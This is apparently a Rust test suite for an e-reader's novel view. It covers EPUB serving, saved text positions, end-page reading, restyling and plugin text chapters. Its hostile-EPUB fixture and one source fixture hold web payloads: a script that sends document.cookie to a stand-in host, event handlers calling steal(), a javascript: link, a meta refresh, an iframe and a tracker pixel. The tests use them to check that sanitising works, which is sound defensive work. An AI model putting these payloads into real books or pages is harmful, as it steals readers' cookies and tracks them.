//! Novels through the session: EPUBs and sources' text chapters served to the web view, the
//! paginator's reports, and the place kept as a text position.

use std::io::Cursor;

use async_trait::async_trait;
use kaeri_books::write::{BookMeta, EpubFlavor, EpubWriter};
use kaeri_core::{
    books::{
        BookHints, BookSourceKind, BookSourceManifest, ChapterContent, SeriesDetail, SeriesHit,
        SourceChapter,
    },
    error::ProviderError,
};
use kaeri_model::reader::{BookBody, BookResource, NovelOpenView, NovelPos};

use super::*;

/// A two-document novel, with a stylesheet and a picture.
fn epub(path: &Path, title: &str) {
    let mut w = EpubWriter::new(
        Cursor::new(Vec::new()),
        BookMeta { title: title.into(), language: "en".into(), ..BookMeta::default() },
        EpubFlavor::Epub,
        None,
    )
    .unwrap();
    let picture = image::GrayImage::from_pixel(40, 60, image::Luma([90]));
    let mut png = Vec::new();
    picture.write_to(&mut Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
    w.add_resource("images/lamp.png", "image/png", &png).unwrap();
    w.add_resource("style.css", "text/css", b"p { text-indent: 1em }").unwrap();
    w.add_chapter("One", "<h1>One</h1><p>The lantern keeper climbed the stair.</p><img src=\"images/lamp.png\" alt=\"\"/>").unwrap();
    w.add_chapter("Two", "<h1>Two</h1><p>The tide came in under the pier.</p>").unwrap();
    std::fs::write(path, w.finish().unwrap().into_inner()).unwrap();
}

/// An EPUB a hostile packager made by hand: a script in the manifest, handlers, a remote
/// picture, a refresh to elsewhere.
fn hostile(path: &Path) {
    let file = std::fs::File::create(path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let o = zip::write::SimpleFileOptions::default();
    let mut put = |name: &str, text: &str| {
        zip.start_file(name, o).unwrap();
        zip.write_all(text.as_bytes()).unwrap();
    };
    put("mimetype", "application/epub+zip");
    put(
        "META-INF/container.xml",
        r#"<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OPS/book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>"#,
    );
    put(
        "OPS/book.opf",
        r#"<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:00000000-0000-4000-8000-000000000001</dc:identifier><dc:title>The Quiet Harbour</dc:title><dc:language>en</dc:language></metadata><manifest><item id="t" href="text.xhtml" media-type="application/xhtml+xml"/><item id="s" href="run.js" media-type="application/javascript"/></manifest><spine><itemref idref="t"/></spine></package>"#,
    );
    put(
        "OPS/text.xhtml",
        r#"<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="refresh" content="0;url=https://elsewhere.example/"/><script src="run.js"></script><base href="https://elsewhere.example/"/></head><body onload="steal()"><p onclick="steal()">Harbour lights.</p><img src="https://tracker.example/pixel.png"/><a href="javascript:steal()">Go</a><iframe src="https://elsewhere.example/"></iframe></body></html>"#,
    );
    put("OPS/run.js", "fetch('https://elsewhere.example/'+document.cookie)");
    zip.finish().unwrap();
}

fn shelf_file(path: &Path, n: i64, format: &str) -> ShelfFile {
    ShelfFile {
        path: path.display().to_string(),
        chapter: None,
        label: format!("Chapter {n}"),
        volume: None,
        number_milli: Some(n * 1000),
        format: format.into(),
        pages: None,
        comicinfo: None,
        source: None,
    }
}

/// A novel work of two EPUB volumes.
fn novel_harness() -> Harness {
    harness_of(Store::open_in_memory().unwrap(), "novel", |books| {
        (1..=2)
            .map(|n| {
                let path = books.join(format!("Volume {n}.epub"));
                epub(&path, &format!("The Lantern Keeper {n}"));
                shelf_file(&path, n, "epub")
            })
            .collect()
    })
}

impl Harness {
    async fn open_novel(&mut self, at: OpenAt) -> (ReaderView, NovelOpenView) {
        let work = WorkId::new(WORK);
        self.send(ReaderCommand::Open { work, chapter: None, at, surface: surface() });
        let view = self
            .until(|e| match e {
                ReaderEvent::Opened(view) => Some(view.as_ref().clone()),
                _ => None,
            })
            .await;
        let novel = self
            .until(|e| match e {
                ReaderEvent::NovelOpen(view) => Some(view.clone()),
                _ => None,
            })
            .await;
        (view, novel)
    }

    fn at(&mut self, pos: NovelPos, page: u32, pages: u32, how: TurnHow) {
        let session = self.session();
        let chapter = self.reader.session.as_ref().unwrap().chapter().id.clone();
        self.send(ReaderCommand::NovelAt { session, chapter, pos, page, pages, how });
    }

    fn get(&self, url: &str) -> BookResource {
        self.services.novels.resource(url).expect("a book's address")
    }
}

fn text(r: &BookResource) -> String {
    match &r.body {
        BookBody::Bytes { data } => String::from_utf8(data.clone()).unwrap(),
        BookBody::File { path } => std::fs::read_to_string(path).unwrap(),
    }
}

fn pos(spine: u32, path: &[u32], offset: u32) -> NovelPos {
    NovelPos { spine, path: path.to_vec(), offset }
}

#[tokio::test(start_paused = true)]
async fn an_epub_opens_in_the_web_view_with_its_files_served_cleaned() {
    let mut h = novel_harness();
    let (view, novel) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(view.medium, Medium::Novel);
    assert_eq!(view.chapter.id.as_str(), "1");
    assert_eq!(novel.spine.len(), 2, "the two chapters");
    assert!(novel.spine.iter().all(|s| s.linear));
    assert!(novel.entry.starts_with("kaeri-book://"), "{}", novel.entry);
    assert_eq!(novel.restore, None);
    assert_eq!(novel.toc.iter().map(|t| t.label.as_str()).collect::<Vec<_>>(), ["One", "Two"]);
    let style: serde_json::Value = serde_json::from_str(&novel.style).unwrap();
    assert_eq!(style["look"]["name"], "light");
    assert_eq!(style["mode"], "paged");
    assert!(!novel.count_key.is_empty() && novel.counted.is_empty());

    // The first chapter's document: cleaned, with its setup, under the policy.
    let first = &novel.toc[0].url;
    let doc = h.get(first);
    assert_eq!((doc.status, doc.mime.as_str()), (200, "application/xhtml+xml"));
    let csp = doc.headers.iter().find(|h| h.name == "Content-Security-Policy").unwrap();
    assert!(csp.value.contains("script-src 'none'"));
    let body = text(&doc);
    assert!(body.contains("name=\"kaeri-setup\"") && body.contains("lantern keeper"), "{body}");

    // Its picture, as a file; its stylesheet, cleaned.
    let base = first.rsplit_once('/').unwrap().0;
    let picture = h.get(&format!("{base}/images/lamp.png"));
    assert_eq!((picture.status, picture.mime.as_str()), (200, "image/png"));
    let BookBody::File { path } = &picture.body else { panic!("a file") };
    assert!(Path::new(path).exists());
    assert_eq!(h.get(&format!("{base}/style.css")).mime, "text/css");
    assert_eq!(h.get(&format!("{base}/nothing.css")).status, 404);

    // Closed, nothing is served and the files are gone.
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    assert_eq!(h.get(first).status, 404);
    assert!(!Path::new(path).exists());
}

#[tokio::test(start_paused = true)]
async fn a_hostile_book_reads_with_nothing_active_and_nothing_remote() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |books| {
        let path = books.join("Volume 1.epub");
        hostile(&path);
        vec![shelf_file(&path, 1, "epub")]
    });
    let (_, novel) = h.open_novel(OpenAt::Start).await;
    let doc = h.get(&novel.entry);
    assert_eq!(doc.status, 200);
    let body = text(&doc);
    let plain = body.replace('\u{AD}', "");
    assert!(plain.contains("Harbour lights."), "{body}");
    for gone in [
        "<script",
        "onload",
        "onclick",
        "javascript:",
        "<iframe",
        "<base",
        "refresh",
        "tracker.example",
    ] {
        assert!(!body.contains(gone), "{gone} in {body}");
    }
    let script = novel.entry.replace("text.xhtml", "run.js");
    assert_eq!(h.get(&script).status, 403, "scripts are never served");
}

#[tokio::test(start_paused = true)]
async fn novel_places_are_text_positions_that_resume_with_back_to_page() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let first = novel.spine.iter().position(|s| s.linear).unwrap() as u32;
    h.at(pos(first, &[1], 0), 0, 4, TurnHow::Turn);
    let kept = h.kept("1").unwrap();
    assert_eq!(kept.novel_pos.as_deref(), Some(format!("{first}/1/0").as_str()));

    // A jump offers the place it left.
    tokio::time::advance(WRITE_EVERY).await;
    h.at(pos(first, &[3], 12), 2, 4, TurnHow::Jump);
    assert_eq!(notices(&h.drain()), [ReadingMsg::ReaderBackToPage { page: 1 }]);
    h.send(ReaderCommand::BackTo { session: h.session() });
    let back = h
        .until(|e| match e {
            ReaderEvent::GoTo { place, .. } => Some(place.clone()),
            _ => None,
        })
        .await;
    assert_eq!(back.novel, Some(pos(first, &[1], 0)));

    // Closed and opened again: the place comes back, in the address and the view, and the
    // notice waits for the first page.
    h.at(pos(first, &[3], 12), 2, 4, TurnHow::Turn);
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    let (_, again) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(again.restore, Some(pos(first, &[3], 12)));
    assert!(again.entry.ends_with(&format!("#kaeri:pos={first}/3/12")), "{}", again.entry);
    assert!(notices(&h.drain()).is_empty());
    h.at(pos(first, &[3], 12), 2, 4, TurnHow::Turn);
    assert_eq!(notices(&h.drain()), [ReadingMsg::ReaderResumed { page: 3 }]);

    // Start over goes to the top of the flow.
    h.send(ReaderCommand::StartOver { session: h.session() });
    let start = h
        .until(|e| match e {
            ReaderEvent::GoTo { place, .. } => Some(place.clone()),
            _ => None,
        })
        .await;
    assert_eq!(start.novel, Some(pos(first, &[], 0)));
}

#[tokio::test(start_paused = true)]
async fn the_last_page_of_the_last_document_reads_after_it_holds_and_the_end_page_at_once() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let last = novel.spine.iter().rposition(|s| s.linear).unwrap() as u32;
    // The last page of an earlier document is not the end.
    h.at(pos(0, &[0], 0), 2, 3, TurnHow::Turn);
    tokio::time::advance(READ_AFTER * 2).await;
    assert!(!h.drain().iter().any(|e| matches!(e, ReaderEvent::ChapterRead { .. })));

    h.at(pos(last, &[2], 0), 1, 2, TurnHow::Turn);
    let before = Instant::now();
    h.until(|e| matches!(e, ReaderEvent::EndPage { .. }).then_some(())).await;
    h.until(|e| matches!(e, ReaderEvent::ChapterRead { .. }).then_some(())).await;
    assert!(before.elapsed() >= READ_AFTER - Duration::from_millis(10));
    assert!(h.kept("1").unwrap().read);

    // The next volume: its end page reads it at once.
    h.send(ReaderCommand::OpenChapter { session: h.session(), chapter: ChapterId::new("2") });
    h.until(|e| matches!(e, ReaderEvent::NovelOpen(_)).then_some(())).await;
    h.at(pos(last, &[2], 0), 2, 2, TurnHow::Swipe);
    let read = h
        .until(|e| match e {
            ReaderEvent::ChapterRead { chapter, .. } => Some(chapter.clone()),
            _ => None,
        })
        .await;
    assert_eq!(read.as_str(), "2");
}

#[tokio::test(start_paused = true)]
async fn a_setting_restyles_the_open_book_and_counts_are_kept_per_key() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let session = h.session();
    let pages = vec![1; novel.spine.len()];
    let mut counted = pages.clone();
    counted[0] = 5;
    h.send(ReaderCommand::NovelCounted {
        session,
        key: novel.count_key.clone(),
        chapter_pages: counted.clone(),
    });
    // A count under another key is not this layout's.
    h.send(ReaderCommand::NovelCounted { session, key: "old".into(), chapter_pages: pages });

    h.send(ReaderCommand::SetSetting {
        session: Some(session),
        medium: Medium::Novel,
        work: None,
        key: Key::Look,
        scope: kaeri_model::reader::SettingScope::Medium,
        value: kaeri_model::reader::ReaderValue::Choice { name: "dark".into() },
    });
    let (style, key) = h
        .until(|e| match e {
            ReaderEvent::NovelStyle { style, count_key, .. } => {
                Some((style.clone(), count_key.clone()))
            }
            _ => None,
        })
        .await;
    let style: serde_json::Value = serde_json::from_str(&style).unwrap();
    assert_eq!(
        (style["look"]["name"].as_str(), style["look"]["ink"].as_bool()),
        (Some("dark"), Some(true))
    );
    assert_ne!(key, novel.count_key, "the count key follows the settings");
    // What is served now carries the new look.
    let doc = text(&h.get(&novel.toc[0].url));
    assert!(doc.contains("#161A2E"), "{doc}");

    // Back to the first look, the first counts come back with the book.
    h.send(ReaderCommand::SetSetting {
        session: Some(session),
        medium: Medium::Novel,
        work: None,
        key: Key::Look,
        scope: kaeri_model::reader::SettingScope::Medium,
        value: kaeri_model::reader::ReaderValue::Choice { name: "light".into() },
    });
    h.send(ReaderCommand::Close { session });
    let (_, again) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(again.count_key, novel.count_key);
    assert_eq!(again.counted, counted);
}

#[tokio::test(start_paused = true)]
async fn an_epub_of_pictures_reads_as_pages() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "manga", |books| {
        let path = books.join("Volume 1.epub");
        let mut w = EpubWriter::new(
            Cursor::new(Vec::new()),
            BookMeta { title: "Harbour Sketches".into(), ..BookMeta::default() },
            EpubFlavor::Epub,
            Some(kaeri_books::write::FixedLayout { width: 300, height: 450, spreads: false }),
        )
        .unwrap();
        for i in 0..3u8 {
            let page = image::GrayImage::from_pixel(300, 450, image::Luma([40 + i * 20]));
            let mut png = Vec::new();
            page.write_to(&mut Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
            w.add_image_page(&png, None, None).unwrap();
        }
        std::fs::write(&path, w.finish().unwrap().into_inner()).unwrap();
        vec![shelf_file(&path, 1, "epub")]
    });
    let (_, leaves, _) = h.open(OpenAt::Start).await;
    assert_eq!(leaves.len(), 4, "three pages and the end page");
}

/// A source whose chapters are text.
struct TextSource {
    manifest: BookSourceManifest,
}

#[async_trait]
impl kaeri_core::traits::BookSource for TextSource {
    fn manifest(&self) -> &BookSourceManifest {
        &self.manifest
    }

    async fn search(&self, _: &str, _: &BookHints) -> Result<Vec<SeriesHit>, ProviderError> {
        Ok(Vec::new())
    }

    async fn series(&self, id: &str, _: &BookHints) -> Result<SeriesDetail, ProviderError> {
        Ok(SeriesDetail::new(id, id))
    }

    async fn chapters(
        &self,
        _: &str,
        _: &BookHints,
    ) -> Result<Vec<SourceChapter>, ProviderError> {
        Ok(vec![SourceChapter::new("c1", "1"), SourceChapter::new("c2", "2")])
    }

    async fn content(&self, _: &str, chapter: &str) -> Result<ChapterContent, ProviderError> {
        Ok(ChapterContent::Text(format!(
            "<p>Chapter {chapter} begins at the pier.</p><script>steal()</script><img src=\"https://tracker.example/p.png\"/>"
        )))
    }
}

#[tokio::test(start_paused = true)]
async fn a_sources_text_chapter_is_served_like_a_book() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
    h.services.book_sources.registry.put(Arc::new(TextSource {
        manifest: BookSourceManifest {
            id: "texts".into(),
            name: "Texts".into(),
            version: "1".into(),
            kind: BookSourceKind::Plugin,
            media: vec![Medium::Novel],
            languages: vec!["en".into()],
            allowed_hosts: Vec::new(),
            capabilities: Vec::new(),
        },
    }));
    h.services.store.set_book_match("texts", "series-1", WORK, 90, true, false, 1).unwrap();
    let (view, novel) = h.open_novel(OpenAt::Start).await;
    assert_eq!(view.next.as_ref().map(|c| c.label.as_str()), Some("2"));
    assert_eq!(novel.spine.len(), 1);
    let doc = text(&h.get(&novel.entry));
    assert!(doc.contains("Chapter c1 begins at the pier."), "{doc}");
    assert!(!doc.contains("<script") && !doc.contains("tracker.example"), "{doc}");
    assert!(doc.contains("_kaeri/reader.css"), "{doc}");

    // Its place is kept like a book's.
    h.at(pos(0, &[0], 4), 0, 1, TurnHow::Turn);
    let chapter = view.chapter.id.as_str().to_owned();
    assert_eq!(h.kept(&chapter).and_then(|c| c.novel_pos).as_deref(), Some("0/0/4"));
}
